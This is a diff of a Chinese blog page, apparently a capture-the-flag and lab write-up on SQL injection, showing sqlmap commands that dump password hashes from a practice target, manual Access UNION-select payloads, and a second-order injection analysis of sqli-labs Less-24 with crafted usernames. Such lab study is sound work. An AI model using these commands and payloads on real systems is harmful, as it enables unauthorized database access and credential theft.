@@ -81,19 +81,20 @@
 
 
 
-<meta name="description" content="基于sql的盲注 之前一直没有好好地学习过sqlmap的使用方法 如果是针对post表单这种方式  可以将抓到的包保存成一个文件，然后使用 sqlmap.py -r &amp;quot;post.txt&amp;quot; -p n --dbs 其中-p是指定参数 sqlmap也可以自动搜寻表单sqlmap.py -u &amp;quot;url&amp;quot; --forms 指定参数  趁机学到了一把sqlmap使用 虽">
+<meta name="description" content="基于sql的盲注之前一直没有好好地学习过sqlmap的使用方法 如果是针对post表单这种方式  可以将抓到的包保存成一个文件，然后使用 sqlmap.py -r &amp;quot;post.txt&amp;quot; -p n --dbs 其中-p是指定参数 sqlmap也可以自动搜寻表单sqlmap.py -u &amp;quot;url&amp;quot; --forms 指定参数  趁机学到了一把sqlmap使用虽然这">
 <meta name="keywords" content="wp,ctf,sql">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sql注入实践">
 <meta property="og:url" content="https://prontosil.club/2019/07/15/liang-dao-sql-zhu-ru-ti/index.html">
 <meta property="og:site_name" content="prontosil">
-<meta property="og:description" content="基于sql的盲注 之前一直没有好好地学习过sqlmap的使用方法 如果是针对post表单这种方式  可以将抓到的包保存成一个文件，然后使用 sqlmap.py -r &amp;quot;post.txt&amp;quot; -p n --dbs 其中-p是指定参数 sqlmap也可以自动搜寻表单sqlmap.py -u &amp;quot;url&amp;quot; --forms 指定参数  趁机学到了一把sqlmap使用 虽">
+<meta property="og:description" content="基于sql的盲注之前一直没有好好地学习过sqlmap的使用方法 如果是针对post表单这种方式  可以将抓到的包保存成一个文件，然后使用 sqlmap.py -r &amp;quot;post.txt&amp;quot; -p n --dbs 其中-p是指定参数 sqlmap也可以自动搜寻表单sqlmap.py -u &amp;quot;url&amp;quot; --forms 指定参数  趁机学到了一把sqlmap使用虽然这">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://i.imgur.com/8EdgoS3.png">
 <meta property="og:image" content="https://i.loli.net/2019/08/11/5vAtbEX6sDcnMYK.png">
 <meta property="og:image" content="https://i.loli.net/2019/08/11/xyn5Y4EqVjtPIRG.png">
 <meta property="og:image" content="https://i.imgur.com/nd1VTmg.png">
-<meta property="og:image" content="https://i.imgur.com/B6oLiAA.png">
+<meta property="og:image" content="https://i.imgur.com/iRvoAHX.
+![password](https://i.imgur.com/B6oLiAA.png">
 <meta property="og:image" content="https://i.imgur.com/6KXMijL.png">
 <meta property="og:image" content="https://i.imgur.com/yxq3qQi.png">
 <meta property="og:image" content="https://i.imgur.com/UmyBe7l.png">
@@ -108,7 +109,7 @@
 <meta property="og:updated_time" content="2019-08-21T02:55:23.217Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sql注入实践">
-<meta name="twitter:description" content="基于sql的盲注 之前一直没有好好地学习过sqlmap的使用方法 如果是针对post表单这种方式  可以将抓到的包保存成一个文件，然后使用 sqlmap.py -r &amp;quot;post.txt&amp;quot; -p n --dbs 其中-p是指定参数 sqlmap也可以自动搜寻表单sqlmap.py -u &amp;quot;url&amp;quot; --forms 指定参数  趁机学到了一把sqlmap使用 虽">
+<meta name="twitter:description" content="基于sql的盲注之前一直没有好好地学习过sqlmap的使用方法 如果是针对post表单这种方式  可以将抓到的包保存成一个文件，然后使用 sqlmap.py -r &amp;quot;post.txt&amp;quot; -p n --dbs 其中-p是指定参数 sqlmap也可以自动搜寻表单sqlmap.py -u &amp;quot;url&amp;quot; --forms 指定参数  趁机学到了一把sqlmap使用虽然这">
 <meta name="twitter:image" content="https://i.imgur.com/8EdgoS3.png">
 
 
@@ -416,7 +417,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  955
+                  966
                 </span>
               
 
@@ -453,96 +454,69 @@
       
 
       
-        <h1>基于sql的盲注</h1>
-<p>之前一直没有好好地学习过<code>sqlmap</code>的使用方法</p>
+        <h1 id="基于sql的盲注"><a href="#基于sql的盲注" class="headerlink" title="基于sql的盲注"></a>基于sql的盲注</h1><p>之前一直没有好好地学习过<code>sqlmap</code>的使用方法</p>
 <p>如果是针对post表单这种方式</p>
 <ol>
 <li>可以将抓到的包保存成一个文件，然后使用 <code>sqlmap.py -r &quot;post.txt&quot; -p n --dbs</code> 其中<code>-p</code>是指定参数</li>
 <li>sqlmap也可以自动搜寻表单<code>sqlmap.py -u &quot;url&quot; --forms</code></li>
 <li>指定参数</li>
 </ol>
-<p>趁机学到了一把<code>sqlmap</code>使用
-虽然这个题目是有点。。
-但是注入点的判断也是很重要的</p>
-<h2>爆后端数据库</h2>
-<p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot;</code></p>
+<p>趁机学到了一把<code>sqlmap</code>使用<br>虽然这个题目是有点。。<br>但是注入点的判断也是很重要的</p>
+<h2 id="爆后端数据库"><a href="#爆后端数据库" class="headerlink" title="爆后端数据库"></a>爆后端数据库</h2><p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot;</code></p>
 <p><img src="https://i.imgur.com/8EdgoS3.png" alt="backdatabase"></p>
-<h2>爆数据库</h2>
-<p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs</code></p>
+<h2 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h2><p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs</code></p>
 <p><img src="https://i.loli.net/2019/08/11/5vAtbEX6sDcnMYK.png" alt="8EdgoS3.png"></p>
-<h2>指定数据库报表爆表</h2>
-<p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup --tables</code></p>
+<h2 id="指定数据库报表爆表"><a href="#指定数据库报表爆表" class="headerlink" title="指定数据库报表爆表"></a>指定数据库报表爆表</h2><p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup --tables</code></p>
 <p><img src="https://i.loli.net/2019/08/11/xyn5Y4EqVjtPIRG.png" alt="qNL5qbg.png"></p>
-<h2>指定数据库和表爆字段</h2>
-<p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member --columns</code></p>
+<h2 id="指定数据库和表爆字段"><a href="#指定数据库和表爆字段" class="headerlink" title="指定数据库和表爆字段"></a>指定数据库和表爆字段</h2><p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member --columns</code></p>
 <p><img src="https://i.imgur.com/nd1VTmg.png" alt="column"></p>
-<h2>指定数据库，表，字符然后dump出数据</h2>
-<p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member -C password --dump</code>
-![member](https://i.imgur.com/iRvoAHX.
-<img src="https://i.imgur.com/B6oLiAA.png" alt="password">
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: stormgroup</span><br><span class="line">Table: member</span><br><span class="line">[2 entries]</span><br><span class="line">+-------+----------------------------------+--------+</span><br><span class="line">| name  | password                         | status |</span><br><span class="line">+-------+----------------------------------+--------+</span><br><span class="line">| mozhe | 3114b433dece9180717f2b7de56b28a3 | 0      |</span><br><span class="line">| mozhe | b7a0bebf8287c87253fb2958a390346a | 1      |</span><br><span class="line">+-------+----------------------------------+--------+</span><br></pre></td></tr></table></figure></p>
-<p>解密之后是106370
-这样就能登陆后台了
-<img src="https://i.imgur.com/6KXMijL.png" alt="houtai">
-<img src="https://i.imgur.com/yxq3qQi.png" alt="key0">
-太神奇了</p>
-<p>参考
-<a href="https://blog.csdn.net/u011781521/article/details/58594941" target="_blank" rel="noopener">sqlmap之(六)----POST登陆框注入实战</a></p>
-<h1>SQL手工注入漏洞测试(Access数据库)</h1>
-<p>这道题目就有点神奇了</p>
+<h2 id="指定数据库，表，字符然后dump出数据"><a href="#指定数据库，表，字符然后dump出数据" class="headerlink" title="指定数据库，表，字符然后dump出数据"></a>指定数据库，表，字符然后dump出数据</h2><p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member -C password --dump</code><br><img src="https://i.imgur.com/iRvoAHX.
+![password](https://i.imgur.com/B6oLiAA.png" alt="member"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: stormgroup</span><br><span class="line">Table: member</span><br><span class="line">[2 entries]</span><br><span class="line">+-------+----------------------------------+--------+</span><br><span class="line">| name  | password                         | status |</span><br><span class="line">+-------+----------------------------------+--------+</span><br><span class="line">| mozhe | 3114b433dece9180717f2b7de56b28a3 | 0      |</span><br><span class="line">| mozhe | b7a0bebf8287c87253fb2958a390346a | 1      |</span><br><span class="line">+-------+----------------------------------+--------+</span><br></pre></td></tr></table></figure></p>
+<p>解密之后是106370<br>这样就能登陆后台了<br><img src="https://i.imgur.com/6KXMijL.png" alt="houtai"><br><img src="https://i.imgur.com/yxq3qQi.png" alt="key0"><br>太神奇了</p>
+<p>参考<br><a href="https://blog.csdn.net/u011781521/article/details/58594941" target="_blank" rel="noopener">sqlmap之(六)——POST登陆框注入实战</a></p>
+<h1 id="SQL手工注入漏洞测试-Access数据库"><a href="#SQL手工注入漏洞测试-Access数据库" class="headerlink" title="SQL手工注入漏洞测试(Access数据库)"></a>SQL手工注入漏洞测试(Access数据库)</h1><p>这道题目就有点神奇了</p>
 <p>纯靠猜</p>
 <p><code>order by 4</code>判断有多少个字段</p>
 <p>然后 <code>new_list.asp?id=1 and exists(select * from admin)</code>判断是否存在<code>admin</code></p>
-<p><img src="https://i.imgur.com/UmyBe7l.png" alt="access0">
-接下来判断回显位置
-<code>/new_list.asp?id=1 union select 1,2,3,4 from admin</code></p>
-<p><img src="https://i.imgur.com/eyqGQZO.png" alt="access1">
-接下来猜测字段值
-<code>and exists (select id from admin)</code></p>
-<p>爆出字段值
-<code>union select 1,username,passwd,id from admin</code>
-<img src="https://i.imgur.com/H5rq91S.png" alt="access2"></p>
+<p><img src="https://i.imgur.com/UmyBe7l.png" alt="access0"><br>接下来判断回显位置<br><code>/new_list.asp?id=1 union select 1,2,3,4 from admin</code></p>
+<p><img src="https://i.imgur.com/eyqGQZO.png" alt="access1"><br>接下来猜测字段值<br><code>and exists (select id from admin)</code></p>
+<p>爆出字段值<br><code>union select 1,username,passwd,id from admin</code><br><img src="https://i.imgur.com/H5rq91S.png" alt="access2"></p>
 <p>md5解密一下登陆就行了</p>
 <p><a href="https://blog.csdn.net/qq_39936434/article/details/94718134" target="_blank" rel="noopener">参考</a></p>
-<h1>二次注入分析</h1>
-<p>看一下sqli的第24题</p>
+<h1 id="二次注入分析"><a href="#二次注入分析" class="headerlink" title="二次注入分析"></a>二次注入分析</h1><p>看一下sqli的第24题</p>
 <p>可以注册账号进行登陆，登陆之后可以修改密码。</p>
 <p>登陆点尝试注入发现被检测到了，注册的时候尝试注册<code>admin</code>的账号提示账号已存在</p>
 <p>看一下源码(用的docker环境，mysql登陆没有密码)</p>
 <p>直接全局搜索<code>username</code></p>
 <p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sqli0.png" alt=""></p>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   $username = mysql_real_escape_string($_POST[<span class="string">"login_user"</span>]);</span><br><span class="line">   $password = mysql_real_escape_string($_POST[<span class="string">"login_password"</span>]);</span><br><span class="line">   $sql = <span class="string">"SELECT * FROM users WHERE username='$username' and password='$password'"</span>;</span><br><span class="line"><span class="comment">//$sql = "SELECT COUNT(*) FROM users WHERE username='$username' and password='$password'";</span></span><br><span class="line">   $res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'You tried to be real smart, Try harder!!!! :( '</span>);</span><br><span class="line">   $row = mysql_fetch_row($res);</span><br><span class="line">        <span class="comment">//print_r($row) ;</span></span><br><span class="line">   <span class="keyword">if</span> ($row[<span class="number">1</span>]) &#123;</span><br><span class="line">                        <span class="keyword">return</span> $row[<span class="number">1</span>];</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   $username = mysql_real_escape_string($_POST[<span class="string">"login_user"</span>]);</span><br><span class="line">   $password = mysql_real_escape_string($_POST[<span class="string">"login_password"</span>]);</span><br><span class="line">   $sql = <span class="string">"SELECT * FROM users WHERE username='$username' and password='$password'"</span>;</span><br><span class="line"><span class="comment">//$sql = "SELECT COUNT(*) FROM users WHERE username='$username' and password='$password'";</span></span><br><span class="line">   $res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'You tried to be real smart, Try harder!!!! :( '</span>);</span><br><span class="line">   $row = mysql_fetch_row($res);</span><br><span class="line">        <span class="comment">//print_r($row) ;</span></span><br><span class="line">   <span class="keyword">if</span> ($row[<span class="number">1</span>]) &#123;</span><br><span class="line">                        <span class="keyword">return</span> $row[<span class="number">1</span>];</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这里使用了<code>mysql_real_escape_string</code>方法转义数据，导致注入无法发生</p>
 <p>但是我们尝试注册</p>
 <p>在<code>login_create</code>中有一处：</p>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@<span class="number">44662761</span>c057:/<span class="keyword">var</span>/www/html/Less<span class="number">-24</span><span class="comment"># grep "insert" *</span></span><br><span class="line">login_create.php:   				$sql = <span class="string">"insert into users ( username, password) values(\"$username\", \"$pass\")"</span>;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@<span class="number">44662761</span>c057:/<span class="keyword">var</span>/www/html/Less<span class="number">-24</span><span class="comment"># grep "insert" *</span></span><br><span class="line">login_create.php:   				$sql = <span class="string">"insert into users ( username, password) values(\"$username\", \"$pass\")"</span>;</span><br></pre></td></tr></table></figure>
 <p><code>mysql_escape_string</code>函数也会转义一些字符比如：</p>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $item = <span class="string">"Zak's Laptop"</span>;</span><br><span class="line">    $escaped_item = mysql_escape_string($item);</span><br><span class="line">    printf (<span class="string">"Escaped string: %s\n"</span>, $escaped_item);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>得到
-<code>Escaped string: Zak\'s Laptop</code></p>
-<p>但是我们尝试注册<code>test'#</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $item = <span class="string">"Zak's Laptop"</span>;</span><br><span class="line">    $escaped_item = mysql_escape_string($item);</span><br><span class="line">    printf (<span class="string">"Escaped string: %s\n"</span>, $escaped_item);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>得到<br><code>Escaped string: Zak\&#39;s Laptop</code></p>
+<p>但是我们尝试注册<code>test&#39;#</code></p>
 <p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sqli1.png" alt=""></p>
-<p>成功了？
-看下数据库：</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where username=&quot;test&apos;#&quot;;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| 15 | test&apos;#   | 123      |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
+<p>成功了？<br>看下数据库：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where username=&quot;test&apos;#&quot;;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| 15 | test&apos;#   | 123      |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
 <p>很神奇。。</p>
 <p>传入的<code>username</code>已经被成功转义</p>
 <p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sqli3.png" alt=""></p>
-<p>学习一下<code>mysql_query</code>返回的是一个资源值
-<img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sqli4.png" alt=""></p>
+<p>学习一下<code>mysql_query</code>返回的是一个资源值<br><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sqli4.png" alt=""></p>
 <p>此时构造的sql语句也没问题</p>
 <p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sqli5.png" alt=""></p>
 <p>然而插入的数据就是有问题</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">| 15 | test&apos;#   | 111        |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">14 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">| 15 | test&apos;#   | 111        |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">14 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
 <p>这个可真的没办法了。。</p>
 <p>有个问题，当我登陆的时候：</p>
-<p>sql语句是这样的：
-<code>&quot;SELECT * FROM users WHERE username='test\'#' and password='111'&quot;</code></p>
+<p>sql语句是这样的：<br><code>&quot;SELECT * FROM users WHERE username=&#39;test\&#39;#&#39; and password=&#39;111&#39;&quot;</code></p>
 <p>则此时重置密码</p>
 <p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sqli6.png" alt=""></p>
-<p><code>&quot;UPDATE users SET PASSWORD='' where username='test'#' and password='111' &quot;</code></p>
-<p>此时我构造用户名<code>test' union selct * from users #</code> 登陆的时候的sql语句如下</p>
-<p><code>&quot;SELECT * FROM users WHERE username='test\' union selct * from users #' and password='111'&quot;</code></p>
+<p><code>&quot;UPDATE users SET PASSWORD=&#39;&#39; where username=&#39;test&#39;#&#39; and password=&#39;111&#39; &quot;</code></p>
+<p>此时我构造用户名<code>test&#39; union selct * from users #</code> 登陆的时候的sql语句如下</p>
+<p><code>&quot;SELECT * FROM users WHERE username=&#39;test\&#39; union selct * from users #&#39; and password=&#39;111&#39;&quot;</code></p>
 <p>此时还是无法直接注入的，因为单引号被转义无法闭合</p>
 
       
@@ -780,7 +754,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#undefined"><span class="nav-number">1.</span> <span class="nav-text">基于sql的盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">1.1.</span> <span class="nav-text">爆后端数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">1.2.</span> <span class="nav-text">爆数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">1.3.</span> <span class="nav-text">指定数据库报表爆表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">1.4.</span> <span class="nav-text">指定数据库和表爆字段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">1.5.</span> <span class="nav-text">指定数据库，表，字符然后dump出数据</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#undefined"><span class="nav-number">2.</span> <span class="nav-text">SQL手工注入漏洞测试(Access数据库)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#undefined"><span class="nav-number">3.</span> <span class="nav-text">二次注入分析</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#基于sql的盲注"><span class="nav-number">1.</span> <span class="nav-text">基于sql的盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#爆后端数据库"><span class="nav-number">1.1.</span> <span class="nav-text">爆后端数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#爆数据库"><span class="nav-number">1.2.</span> <span class="nav-text">爆数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#指定数据库报表爆表"><span class="nav-number">1.3.</span> <span class="nav-text">指定数据库报表爆表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#指定数据库和表爆字段"><span class="nav-number">1.4.</span> <span class="nav-text">指定数据库和表爆字段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#指定数据库，表，字符然后dump出数据"><span class="nav-number">1.5.</span> <span class="nav-text">指定数据库，表，字符然后dump出数据</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL手工注入漏洞测试-Access数据库"><span class="nav-number">2.</span> <span class="nav-text">SQL手工注入漏洞测试(Access数据库)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#二次注入分析"><span class="nav-number">3.</span> <span class="nav-text">二次注入分析</span></a></li></ol></div>
             
 
           </div>
